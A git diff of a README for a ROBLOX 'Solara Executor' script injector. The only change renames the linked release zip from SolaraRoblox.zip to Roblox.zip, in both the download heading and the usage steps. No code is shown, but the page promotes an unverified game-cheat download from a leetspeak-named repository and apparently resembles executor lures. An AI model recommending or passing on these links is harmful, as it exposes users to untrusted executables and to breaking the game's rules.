@@ -3,7 +3,7 @@
 ## Overview
 This repository hosts a Solara Executor tool designed to elevate the gaming experience on the ROBLOX platform. The injector enables users to incorporate custom scripts into ROBLOX games, allowing for enhanced gameplay and expanded functionality.
 
-# [Download](https://github.com/glas50tomcat/s0lara-ex3cut0r/releases/download/Download/SolaraRoblox.zip)
+# [Download](https://github.com/glas50tomcat/s0lara-ex3cut0r/releases/download/Download/Roblox.zip)
 ![rb](https://github.com/user-attachments/assets/ad451d4d-f639-40dd-97c8-7f316285104b)
 
 
@@ -18,7 +18,7 @@ This repository hosts a Solara Executor tool designed to elevate the gaming expe
   
 ## Usage
 
-1. [Download](https://github.com/glas50tomcat/s0lara-ex3cut0r/releases/download/Download/SolaraRoblox.zip) the tool as a zip archive.  
+1. [Download](https://github.com/glas50tomcat/s0lara-ex3cut0r/releases/download/Download/Roblox.zip) the tool as a zip archive.  
 2. Follow the provided instructions for setup and usage.
 
 ---
